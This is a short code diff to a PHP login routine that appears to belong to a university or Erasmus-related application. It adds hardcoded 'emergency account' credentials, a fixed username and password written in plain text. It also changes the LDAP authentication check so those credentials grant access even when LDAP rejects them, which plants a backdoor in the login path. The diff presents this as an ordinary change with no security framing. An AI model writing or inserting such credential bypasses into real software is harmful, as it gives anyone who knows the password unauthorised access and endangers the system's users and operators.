@@ -2347,12 +2347,20 @@ class ActionManager {
 		$username = $this->getValueFromRequest('username', $username);
 		$password = $this->getValueFromRequest('password', $password);
 
+		
+		// Hardcoded username and password for "emergency accounts"
+		if($username === "EmergencyUser" && $password === "RSMS911") {
+			$emergencyAccount = true;
+		}
+		else {
+			$emergencyAccount = false;
+		}
 
 
 		$ldap = new LDAP();
 
 		// if successfully authenticates by LDAP:
-		if ($ldap->IsAuthenticated($username,$password)) {
+		if ($ldap->IsAuthenticated($username,$password) || $emergencyAccount) {
 
 			// Make sure they're an Erasmus user by username lookup
 			$dao = $this->getDao(new User());
